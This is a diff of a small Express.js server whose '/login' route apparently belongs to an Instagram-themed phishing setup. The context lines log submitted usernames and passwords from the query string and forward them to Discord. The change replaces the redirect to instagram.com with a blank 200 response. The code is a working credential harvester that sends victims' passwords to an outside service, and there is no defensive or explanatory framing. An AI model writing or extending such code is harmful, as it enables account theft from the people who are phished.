@@ -8,7 +8,7 @@ app.get('/login', (req, res) => {
   console.log('Received request to login')
   console.log(`username:${req.query.username},pw:${req.query.n}`)
   postMessageToDiscord({username: req.query.username, pw: req.query.n})
-  res.redirect("https://instagram.com")
+  res.status(200).send()
 })
 
 
